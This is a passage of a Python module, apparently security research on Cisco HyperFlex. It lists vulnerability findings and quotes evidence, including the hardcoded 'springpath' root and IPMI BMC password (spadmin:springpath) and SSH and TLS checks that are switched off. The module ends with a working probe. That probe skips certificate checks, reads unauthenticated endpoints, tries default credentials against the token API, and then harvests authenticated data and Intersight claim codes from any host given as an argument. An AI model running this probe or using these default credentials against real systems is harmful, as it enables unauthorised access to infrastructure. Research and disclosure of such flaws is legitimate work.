        "connections, and makes REST calls to vSphere APIs using the now-unverified "
        "SSL context."
    ),
    "evidence": (
        "  config-ctlvm.py L533-534:\n"
        "    def main():\n"
        "        try:\n"
        "            ssl._create_default_https_context = \\\n"
        "                    ssl._create_unverified_context\n"
        "        except:\n"
        "            pass\n"
        "\n"
        "  config-ctlvm.py L427-429:\n"
        "    parser.add_argument('-p', '--password',\n"
        "            action = 'store',\n"
        "            help = argparse.SUPPRESS)  # hidden credential argument"
    ),
}


HX_F316 = {
    "id": "HX-F316",
    "title": (
        "Hardcoded Default Credential 'springpath' Used as ESX Root Password Default "
        "in Six configureNetworking_VCenter.py Copies and Set as IPMI BMC Password "
        "in replaceNode.sh"
    ),
    "cwe": "CWE-798",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/configureNetworking_VCenter.py:L319 "
        "(and 5 identical copies at roles/esx/files/, roles/upgrademigration/files/, "
        "and 3 additional paths); "
        "mgmt/opt/hyperflex/storfs-deploy/ansible/replaceNode.sh:L274"
    ),
    "description": (
        "The password string 'springpath' is hardcoded as the default ESX root "
        "credential and unconditionally set as an IPMI BMC user password across "
        "the HyperFlex deployment and maintenance toolchain. "
        "configureNetworking_VCenter.py (6 identical copies) defines "
        "ESX_USER = 'root' and ESX_PWD = 'springpath' at L319 as the class-level "
        "default. The deployment documentation embedded in the script specifies "
        "that '--esx-password ESXi password (defaults to springpath)' — if the "
        "operator does not provide an explicit ESX password, all ESX hosts in the "
        "cluster are accessed with root:springpath. "
        "replaceNode.sh unconditionally sets IPMI user 10 (named 'spadmin') to "
        "password 'springpath' via ipmitool at L274 during node replacement. "
        "The IPMI BMC port (623/UDP) provides out-of-band access independent of "
        "the host OS — an attacker with access to the management network can "
        "authenticate to the BMC of any node that has had replaceNode.sh executed "
        "against it using spadmin:springpath, gaining full server control including "
        "remote KVM, power cycling, and firmware update capabilities regardless "
        "of any OS-level security controls."
    ),
    "evidence": (
        "  configureNetworking_VCenter.py L319 (6 identical copies):\n"
        "    ESX_USER = \"root\"\n"
        "    ESX_PWD = \"springpath\"\n"
        "\n"
        "  configureNetworking_VCenter.py L387-389 (deployment docstring):\n"
        "    --esx-password - ESXi password (defaults to \"springpath\").\n"
        "    --ctl-password - controller password (defaults to \"springpath\")\n"
        "\n"
        "  replaceNode.sh L270-279:\n"
        "    # Adding Springpath User to Appliance using ipmitool\n"
        "    runCmdOnEsx /opt/cisco/support/ipmitool user set name 10 spadmin\n"
        "    # password for user 10 is being changed\n"
        "    runCmdOnEsx /opt/cisco/support/ipmitool user set password 10 springpath\n"
        "    runCmdOnEsx /opt/cisco/support/ipmitool user priv 10 4 1\n"
        "    runCmdOnEsx /opt/cisco/support/ipmitool user enable 10\n"
        "    # user ID 10, privilege 4 (Administrator), channel 1"
    ),
}

HX_F317 = {
    "id": "HX-F317",
    "title": (
        "replaceNode.sh Disables SSH Host Key Verification and Uses sshpass for "
        "All ESX SSH/SCP Operations; wget --no-check-certificate With Password "
        "as Command-Line Argument"
    ),
    "cwe": "CWE-322",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/replaceNode.sh "
        "(L159, L165, L172, L176, L602)"
    ),
    "description": (
        "replaceNode.sh disables SSH host key verification for all SSH and SCP "
        "operations against ESX hosts and controller VMs during node replacement. "
        "The runCmdOnEsx, scpToEsx, scpToStCtlVM, and runCmdOnStctlVM functions "
        "(L159, L165, L172, L176) all use sshpass -p $PASSWD with "
        "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null. "
        "sshpass -p passes the SSH password via command line argument, making it "
        "visible in /proc/<pid>/cmdline and ps aux. StrictHostKeyChecking=no "
        "accepts any SSH host key, making all SSH/SCP operations in the node "
        "replacement workflow vulnerable to MITM attacks. UserKnownHostsFile=/dev/null "
        "prevents any known-hosts persistence, ensuring no memory of previously "
        "verified host keys. "
        "At L602, the script waits for an ESX host to come back online using "
        "wget --no-check-certificate (disabling TLS validation) with "
        "--http-password $PASSWD passed as a command-line argument, making the "
        "ESX root password visible in the wget process table entry. "
        "Additionally, L328 embeds ESX credentials directly in a vSphere VMware URL: "
        "vi://${USERNAME}:${PASSWD}@${ESXHOST}/ for OVF deployment."
    ),
    "evidence": (
        "  replaceNode.sh L156-159:\n"
        "    PASSWD=$(springpath_env_parse.py \"credentials.stctl_vm_passwd\")\n"
        "    function runCmdOnEsx() {\n"
        "        sshpass -p $PASSWD ssh -q \\\n"
        "          -o StrictHostKeyChecking=no \\\n"
        "          -o UserKnownHostsFile=/dev/null ${USERNAME}@$ESXHOST $*\n"
        "    }\n"
        "\n"
        "  replaceNode.sh L165 (scpToEsx), L172 (scpToStCtlVM),\n"
        "  L176 (runCmdOnStctlVM): identical StrictHostKeyChecking=no pattern\n"
        "\n"
        "  replaceNode.sh L328:\n"
        "    ${SCVMIMAGE} vi://${USERNAME}:${PASSWD}@${ESXHOST}/\n"
        "\n"
        "  replaceNode.sh L602:\n"
        "    wget -q -O /dev/null --no-check-certificate \\\n"
        "      https://$ESXHOST/mob \\\n"
        "      --http-user $USERNAME --http-password $PASSWD"
    ),
}

HX_F318 = {
    "id": "HX-F318",
    "title": (
        "switchToArbitrator.py Disables TLS Validation for All Intersight Arbitrator "
        "REST Calls and Accepts Arbitrator Password as Command-Line Argument"
    ),
    "cwe": "CWE-295",
    "severity": "MEDIUM",
    "cvss": 5.9,
    "component": (
        "stretched/usr/share/hyperflex/storfs-stretched/switchToArbitrator.py "
        "(L60-61, L134)"
    ),
    "description": (
        "switchToArbitrator.py — the HyperFlex stretched cluster Intersight arbitrator "
        "switchover script — passes verify=False in all REST calls to the arbitrator "
        "service via the restWithRetry function at L134. "
        "The script accepts the Intersight arbitrator password as a command-line "
        "argument via --arbitrator-password at L60-61, making the credential visible "
        "in /proc/<pid>/cmdline and ps aux during switchover operations. "
        "TLS validation is disabled for the REST calls that perform the cluster "
        "quorum arbitrator switchover — a security-critical operation for stretched "
        "cluster split-brain prevention. An MITM can serve fraudulent arbitrator "
        "responses to manipulate which cluster site is granted quorum."
    ),
    "evidence": (
        "  switchToArbitrator.py L60-61:\n"
        "    p.add_option('--arbitrator-password', dest='password', default='',\n"
        "                 type='string', help='The password of the intersight arbitrator')\n"
        "\n"
        "  switchToArbitrator.py L128-135:\n"
        "    def restWithRetry(restFn, restUrl, data, auth, headers,\n"
        "                      retryCount, retryInterval):\n"
        "        count = 0\n"
        "        while count < retryCount:\n"
        "            try:\n"
        "                resp = restFn(url=restUrl, data=data, auth=auth,\n"
        "                             headers=headers, verify=False)\n"
        "            ..."
    ),
}


for _f in [
    HX_F254,
    HX_F256,
    HX_F260,
    HX_F261,
    HX_F263,
    HX_F268,
    HX_F269,
    HX_F271,
    HX_F272,
    HX_F274,
    HX_F276,
    HX_F278,
    HX_F279,
    HX_F282,
    HX_F283,
    HX_F289,
    HX_F295,
    HX_F296,
    HX_F297,
    HX_F298,
    HX_F299,
    HX_F300,
    HX_F301,
    HX_F302,
    HX_F303,
    HX_F304,
    HX_F305,
    HX_F306,
    HX_F307,
    HX_F308,
    HX_F309,
    HX_F310,
    HX_F311,
    HX_F315,
    HX_F316,
    HX_F317,
    HX_F318,
]:
    FINDINGS[_f["id"]] = _f
# ─── Probe Functions ──────────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _hx_request(host: str, path: str, method: str = "GET",
                 token: Optional[str] = None, body: Optional[dict] = None,
                 timeout: int = 8) -> Optional[dict]:
    url = f"https://{host}{path}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")
    if token:
        req.add_header("hx-auth-token", token)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            raw = r.read()
            return json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        return {"__http_error": e.code, "__reason": str(e.reason)}
    except Exception:
        return None


def probe_hx_connect(host: str, timeout: int = 8) -> dict:
    result = {
        "host": host, "port": HX_CONNECT_PORT, "reachable": False,
        "version": None, "unauth_data": {}, "cred_result": None,
        "auth_data": {}, "intersight_claim_code": None,
    }

    try:
        s = socket.create_connection((host, HX_CONNECT_PORT), timeout=timeout)
        s.close()
        result["reachable"] = True
    except Exception:
        return result

    for path in HX_UNAUTH_PATHS:
        data = _hx_request(host, path, timeout=timeout)
        if data and "__http_error" not in data:
            result["unauth_data"][path] = data
            if "version" in data or "hxVersion" in data:
                result["version"] = data.get("version") or data.get("hxVersion")

    token = None
    for user, passwd in HX_DEFAULT_CREDS:
        body = {"username": user, "password": passwd}
        resp = _hx_request(host, "/rest/v1/tokens", method="POST",
                           body=body, timeout=timeout)
        if resp and "token" in resp:
            token = resp["token"]
            result["cred_result"] = {"user": user, "pass": passwd}
            break
        if resp and "__http_error" in resp and resp["__http_error"] == 429:
            break

    if token:
        for key, path in HX_AUTH_PATHS.items():
            data = _hx_request(host, path, token=token, timeout=timeout)
            if data and "__http_error" not in data:
                result["auth_data"][key] = data

        conn = result["auth_data"].get("intersight_conn", {})
        result["intersight_claim_code"] = conn.get("claimCode") or conn.get("deviceId")

    return result


if __name__ == "__main__":
    import sys

    print("=== Cisco HyperFlex RE Module ===")
    print(f"Findings: {len(FINDINGS)} (HX-F01 through HX-F{max(int(k.split('-F')[1]) for k in FINDINGS)})")
    print()

    for fid, f in FINDINGS.items():
        sev = f["severity"]
        print(f"[{sev:8}] {fid}: {f['title']}")

    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"[*] Probing {target}")
        print(json.dumps(probe_hx_connect(target), indent=2))
